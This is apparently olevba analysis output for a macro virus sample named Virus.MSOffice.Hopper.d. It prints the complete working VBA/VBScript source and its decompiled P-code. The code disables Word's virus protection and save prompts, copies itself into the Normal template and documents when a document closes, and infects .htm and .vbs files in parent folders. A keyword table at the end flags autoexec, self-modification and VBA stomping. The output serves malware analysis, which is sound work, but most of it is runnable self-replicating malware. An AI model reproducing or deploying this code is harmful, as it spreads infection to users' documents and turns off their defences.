olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Hopper.d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSOffice.Hopper.d - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio1.cls 
in file: ./Virus.MSOffice.Hopper.d - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio2.cls 
in file: ./Virus.MSOffice.Hopper.d - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Foglio3.cls 
in file: ./Virus.MSOffice.Hopper.d - OLE stream: '_VBA_PROJECT_CUR/VBA/Foglio3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSOffice.Hopper.d - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<html> <!--1nternal-->
'<head>
'<meta http-equiv="Content-Type"
'content="text/html; charset=iso-8859-1">
'<meta name="Author" content="1nternal">
'</head>
'<BODY>
'<script language="VBScript"><!--
'On Error Resume Next
'HostType = "VBS"
'HostPath = Wscript.ScriptFullName
'Call InfWord
'Call FindHTMVBS

Private FSO, NT, HostType, InfType, HostPath, Target, NextLine, TempFile

Private Sub FindHTMVBS()
        Set FSO = CreateObject("Scripting.FileSystemObject")
        cpath = FSO.GetParentFolderName(HostPath)
        Set folder = FSO.GetFolder(cpath)
        While folder.IsRootFolder = False
                Set folder = FSO.GetFolder(cpath)
                Set fc = folder.Files
                cpath = FSO.GetParentFolderName(cpath)
                For Each Target In fc
                        InfType = LCase(FSO.GetExtensionName(Target.Name))
                        If InfType = "html" Then InfType = "htm"
                        If InfType = "htm" Or InfType = "vbs" And Target.Path <> HostPath Then
                                Set fh = FSO.opentextfile(Target.Path, 1, True)
                                TestString = fh.ReadLine
                                fh.Close
                                If TestString <> "<html> <!--1nternal-->" And TestString <> "'<html> <!--1nternal-->" Then
                                        Call DoFile
                                End If
                        End If
                Next
        Wend
End Sub

Private Sub InfWord()
        Set WordObj = CreateObject("Word.Application")
        Set NT = WordObj.Templates(1).VBProject.VBComponents(1).CodeModule
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                WordObj.Options.SaveNormalPrompt = False
                NT.DeleteLines 1, NT.CountOfLines
                NT.AddFromFile HostPath
                NT.DeleteLines 171, (NT.CountOfLines - 170)
                If HostType = "HTM" Then
                        For j = 1 To 9
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                        For j = 168 To 170
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                Else
                        For j = 9 To 13
                                NT.ReplaceLine j, "'" + NT.Lines(j, 1)
                        Next
                End If
        End If
        Set NT = Nothing
        WordObj.Quit
End Sub

Private Sub Window_Onload()
        Randomize
        On Error Resume Next
        If Location.protocol = "file:" And (Int((6 * Rnd) + 1) = 1) Then
                Dim FSO, folder, fc, f1, cpath
                Set FSO = CreateObject("Scripting.FileSystemObject")
                HostPath = Replace(Location.href, "file:///", "")
                HostPath = Replace(HostPath, "/", "\")
                HostType = "HTM"
                Call InfWord
                Call FindHTMVBS
                Window.Status = "ActiveX.Hybrid v0.2 /1nternal"
        End If
End Sub

Private Sub Document_Close()
        On Error Resume Next
        Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
        Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
        Options.VirusProtection = False
        Options.ConfirmConversions = False
        Options.SaveNormalPrompt = False
        If NT.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 170
                        NT.InsertLines i, AD.Lines(i, 1)
                Next
        End If
        If AD.Lines(1, 1) <> "'<html> <!--1nternal-->" Then
                For i = 1 To 170
                        AD.InsertLines i, NT.Lines(i, 1)
                Next
        End If
        HostType = "DOC"
        HostPath = "C:\Windows\Web\Afile.htm"
        If (Int((15 * Rnd) + 1) = 1) Then Call FindHTMVBS
End Sub

Private Sub DoFileFromFile()
        Set fh = FSO.opentextfile(HostPath, 1, True)
        Set ft = FSO.opentextfile(Target.Path, 2, True)
        For j = 1 To 170
                NextLine = fh.ReadLine
                If HostType = "HTM" Then
                        If InfType = "vbs" Then
                                If j < 9 Or j > 167 Then
                                        NextLine = "'" + NextLine
                                End If
                                If j > 8 And j < 14 Then
                                        NextLine = Mid(NextLine, 2)
                                End If
                        End If
                Else
                        If InfType = "htm" Then
                                If j < 9 Or j > 167 Then
                                        NextLine = Mid(NextLine, 2)
                                End If
                                If j > 8 And j < 14 Then
                                        NextLine = "'" + NextLine
                                End If
                        End If
                End If
                ft.WriteLine NextLine
        Next
        fh.Close
        ft.Close
End Sub

Private Sub DoFileFromDoc()
        Set ft = FSO.opentextfile(Target.Path, 2, True)
        For j = 1 To 180
                NextLine = NT.Lines(j, 1)
                If InfType = "htm" Then
                        If j < 9 Or j > 167 Then
                                NextLine = Mid(NextLine, 2)
                        End If
                Else
                        If j > 8 And j < 14 Then
                                NextLine = Mid(NextLine, 2)
                        End If
                End If
                ft.WriteLine NextLine
        Next
        ft.Close
End Sub

Private Sub DoFile()
        TempFile = FSO.GetTempName
        FSO.CopyFile Target.Path, TempFile
        If HostType = "DOC" Then
                Call DoFileFromDoc
        Else
                Call DoFileFromFile
        End If
        Set fh = FSO.opentextfile(TempFile, 1, True)
        Set ft = FSO.opentextfile(Target.Path, 8, True)
        Do While fh.AtEndOfStream <> True
                ft.WriteLine fh.ReadLine
        Loop
        ft.Close
        fh.Close
        FSO.DeleteFile TempFile
End Sub

'--></script>
'</BODY>
'</HTML>
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSOffice.Hopper.d
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 965 bytes
' _VBA_PROJECT_CUR/VBA/Foglio1 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio2 - 958 bytes
' _VBA_PROJECT_CUR/VBA/Foglio3 - 958 bytes
' _VBA_PROJECT_CUR/VBA/ThisDocument - 9365 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0016 "<html> <!--1nternal-->"
' Line #1:
' 	QuoteRem 0x0000 0x0006 "<head>"
' Line #2:
' 	QuoteRem 0x0000 0x001F "<meta http-equiv="Content-Type""
' Line #3:
' 	QuoteRem 0x0000 0x0028 "content="text/html; charset=iso-8859-1">"
' Line #4:
' 	QuoteRem 0x0000 0x0027 "<meta name="Author" content="1nternal">"
' Line #5:
' 	QuoteRem 0x0000 0x0007 "</head>"
' Line #6:
' 	QuoteRem 0x0000 0x0006 "<BODY>"
' Line #7:
' 	QuoteRem 0x0000 0x0020 "<script language="VBScript"><!--"
' Line #8:
' 	QuoteRem 0x0000 0x0014 "On Error Resume Next"
' Line #9:
' 	QuoteRem 0x0000 0x0010 "HostType = "VBS""
' Line #10:
' 	QuoteRem 0x0000 0x0021 "HostPath = Wscript.ScriptFullName"
' Line #11:
' 	QuoteRem 0x0000 0x000C "Call InfWord"
' Line #12:
' 	QuoteRem 0x0000 0x000F "Call FindHTMVBS"
' Line #13:
' Line #14:
' 	Dim (Private) 
' 	VarDefn FSO
' 	VarDefn NT
' 	VarDefn HostType
' 	VarDefn InfType
' 	VarDefn HostPath
' 	VarDefn Target
' 	VarDefn NextLine
' 	VarDefn TempFile
' Line #15:
' Line #16:
' 	FuncDefn (Private Sub FindHTMVBS())
' Line #17:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #18:
' 	Ld HostPath 
' 	Ld FSO 
' 	ArgsMemLd GetParentFolderName 0x0001 
' 	St cpath 
' Line #19:
' 	SetStmt 
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set folder 
' Line #20:
' 	Ld folder 
' 	MemLd IsRootFolder 
' 	LitVarSpecial (False)
' 	Eq 
' 	While 
' Line #21:
' 	SetStmt 
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetFolder 0x0001 
' 	Set folder 
' Line #22:
' 	SetStmt 
' 	Ld folder 
' 	MemLd Files 
' 	Set fc 
' Line #23:
' 	Ld cpath 
' 	Ld FSO 
' 	ArgsMemLd GetParentFolderName 0x0001 
' 	St cpath 
' Line #24:
' 	StartForVariable 
' 	Ld Target 
' 	EndForVariable 
' 	Ld fc 
' 	ForEach 
' Line #25:
' 	Ld Target 
' 	MemLd New 
' 	Ld FSO 
' 	ArgsMemLd GetExtensionName 0x0001 
' 	ArgsLd LCase 0x0001 
' 	St InfType 
' Line #26:
' 	Ld InfType 
' 	LitStr 0x0004 "html"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "htm"
' 	St InfType 
' 	EndIf 
' Line #27:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	Ld InfType 
' 	LitStr 0x0003 "vbs"
' 	Eq 
' 	Ld Target 
' 	MemLd Path 
' 	Ld HostPath 
' 	Ne 
' 	And 
' 	Or 
' 	IfBlock 
' Line #28:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #29:
' 	Ld fh 
' 	MemLd ReadLine 
' 	St TestString 
' Line #30:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #31:
' 	Ld TestString 
' 	LitStr 0x0016 "<html> <!--1nternal-->"
' 	Ne 
' 	Ld TestString 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #32:
' 	ArgsCall (Call) DoFile 0x0000 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' 	Wend 
' Line #37:
' 	EndSub 
' Line #38:
' Line #39:
' 	FuncDefn (Private Sub InfWord())
' Line #40:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #41:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld WordObj 
' 	ArgsMemLd Templates 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #42:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #43:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #45:
' 	Ld HostPath 
' 	Ld NT 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #46:
' 	LitDI2 0x00AB 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	LitDI2 0x00AA 
' 	Sub 
' 	Paren 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	Ld HostType 
' 	LitStr 0x0003 "HTM"
' 	Eq 
' 	IfBlock 
' Line #48:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	For 
' Line #49:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #50:
' 	StartForVariable 
' 	Next 
' Line #51:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x00A8 
' 	LitDI2 0x00AA 
' 	For 
' Line #52:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #53:
' 	StartForVariable 
' 	Next 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0009 
' 	LitDI2 0x000D 
' 	For 
' Line #56:
' 	Ld j 
' 	LitStr 0x0001 "'"
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Add 
' 	Ld NT 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #57:
' 	StartForVariable 
' 	Next 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #61:
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' Line #62:
' 	EndSub 
' Line #63:
' Line #64:
' 	FuncDefn (Private Sub Window_Onload())
' Line #65:
' 	ArgsCall Read 0x0000 
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	Ld Location 
' 	MemLd protocol 
' 	LitStr 0x0005 "file:"
' 	Eq 
' 	LitDI2 0x0006 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #68:
' 	Dim 
' 	VarDefn FSO
' 	VarDefn folder
' 	VarDefn fc
' 	VarDefn f1
' 	VarDefn cpath
' Line #69:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #70:
' 	Ld Location 
' 	MemLd href 
' 	LitStr 0x0008 "file:///"
' 	LitStr 0x0000 ""
' 	ArgsLd Replace 0x0003 
' 	St HostPath 
' Line #71:
' 	Ld HostPath 
' 	LitStr 0x0001 "/"
' 	LitStr 0x0001 "\"
' 	ArgsLd Replace 0x0003 
' 	St HostPath 
' Line #72:
' 	LitStr 0x0003 "HTM"
' 	St HostType 
' Line #73:
' 	ArgsCall (Call) InfWord 0x0000 
' Line #74:
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' Line #75:
' 	LitStr 0x001D "ActiveX.Hybrid v0.2 /1nternal"
' 	Ld Window 
' 	MemSt Status 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	EndSub 
' Line #78:
' Line #79:
' 	FuncDefn (Private Sub Document_Close())
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #82:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #84:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #86:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #87:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00AA 
' 	For 
' Line #88:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #89:
' 	StartForVariable 
' 	Next 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0017 "'<html> <!--1nternal-->"
' 	Ne 
' 	IfBlock 
' Line #92:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00AA 
' 	For 
' Line #93:
' 	Ld i 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #94:
' 	StartForVariable 
' 	Next 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	LitStr 0x0003 "DOC"
' 	St HostType 
' Line #97:
' 	LitStr 0x0018 "C:\Windows\Web\Afile.htm"
' 	St HostPath 
' Line #98:
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) FindHTMVBS 0x0000 
' 	EndIf 
' Line #99:
' 	EndSub 
' Line #100:
' Line #101:
' 	FuncDefn (Private Sub DoFileFromFile())
' Line #102:
' 	SetStmt 
' 	Ld HostPath 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #103:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #104:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00AA 
' 	For 
' Line #105:
' 	Ld fh 
' 	MemLd ReadLine 
' 	St NextLine 
' Line #106:
' 	Ld HostType 
' 	LitStr 0x0003 "HTM"
' 	Eq 
' 	IfBlock 
' Line #107:
' 	Ld InfType 
' 	LitStr 0x0003 "vbs"
' 	Eq 
' 	IfBlock 
' Line #108:
' 	Ld j 
' 	LitDI2 0x0009 
' 	Lt 
' 	Ld j 
' 	LitDI2 0x00A7 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #109:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	Ld j 
' 	LitDI2 0x0008 
' 	Gt 
' 	Ld j 
' 	LitDI2 0x000E 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #112:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	ElseBlock 
' Line #116:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	IfBlock 
' Line #117:
' 	Ld j 
' 	LitDI2 0x0009 
' 	Lt 
' 	Ld j 
' 	LitDI2 0x00A7 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #118:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	Ld j 
' 	LitDI2 0x0008 
' 	Gt 
' 	Ld j 
' 	LitDI2 0x000E 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #121:
' 	LitStr 0x0001 "'"
' 	Ld NextLine 
' 	Add 
' 	St NextLine 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	Ld NextLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #126:
' 	StartForVariable 
' 	Next 
' Line #127:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #128:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #129:
' 	EndSub 
' Line #130:
' Line #131:
' 	FuncDefn (Private Sub DoFileFromDoc())
' Line #132:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0002 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #133:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x00B4 
' 	For 
' Line #134:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	St NextLine 
' Line #135:
' 	Ld InfType 
' 	LitStr 0x0003 "htm"
' 	Eq 
' 	IfBlock 
' Line #136:
' 	Ld j 
' 	LitDI2 0x0009 
' 	Lt 
' 	Ld j 
' 	LitDI2 0x00A7 
' 	Gt 
' 	Or 
' 	IfBlock 
' Line #137:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #138:
' 	EndIfBlock 
' Line #139:
' 	ElseBlock 
' Line #140:
' 	Ld j 
' 	LitDI2 0x0008 
' 	Gt 
' 	Ld j 
' 	LitDI2 0x000E 
' 	Lt 
' 	And 
' 	IfBlock 
' Line #141:
' 	Ld NextLine 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0002 
' 	St NextLine 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	Ld NextLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #145:
' 	StartForVariable 
' 	Next 
' Line #146:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #147:
' 	EndSub 
' Line #148:
' Line #149:
' 	FuncDefn (Private Sub DoFile())
' Line #150:
' 	Ld FSO 
' 	MemLd GetTempName 
' 	St TempFile 
' Line #151:
' 	Ld Target 
' 	MemLd Path 
' 	Ld TempFile 
' 	Ld FSO 
' 	ArgsMemCall CopyFile 0x0002 
' Line #152:
' 	Ld HostType 
' 	LitStr 0x0003 "DOC"
' 	Eq 
' 	IfBlock 
' Line #153:
' 	ArgsCall (Call) DoFileFromDoc 0x0000 
' Line #154:
' 	ElseBlock 
' Line #155:
' 	ArgsCall (Call) DoFileFromFile 0x0000 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	SetStmt 
' 	Ld TempFile 
' 	LitDI2 0x0001 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set fh 
' Line #158:
' 	SetStmt 
' 	Ld Target 
' 	MemLd Path 
' 	LitDI2 0x0008 
' 	LitVarSpecial (True)
' 	Ld FSO 
' 	ArgsMemLd opentextfile 0x0003 
' 	Set ft 
' Line #159:
' 	Ld fh 
' 	MemLd AtEndOfStream 
' 	LitVarSpecial (True)
' 	Ne 
' 	DoWhile 
' Line #160:
' 	Ld fh 
' 	MemLd ReadLine 
' 	Ld ft 
' 	ArgsMemCall WriteLine 0x0001 
' Line #161:
' 	Loop 
' Line #162:
' 	Ld ft 
' 	ArgsMemCall Close 0x0000 
' Line #163:
' 	Ld fh 
' 	ArgsMemCall Close 0x0000 
' Line #164:
' 	Ld TempFile 
' 	Ld FSO 
' 	ArgsMemCall DeleteFile 0x0001 
' Line #165:
' 	EndSub 
' Line #166:
' Line #167:
' 	QuoteRem 0x0000 0x000C "--></script>"
' Line #168:
' 	QuoteRem 0x0000 0x0007 "</BODY>"
' Line #169:
' 	QuoteRem 0x0000 0x0007 "</HTML>"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

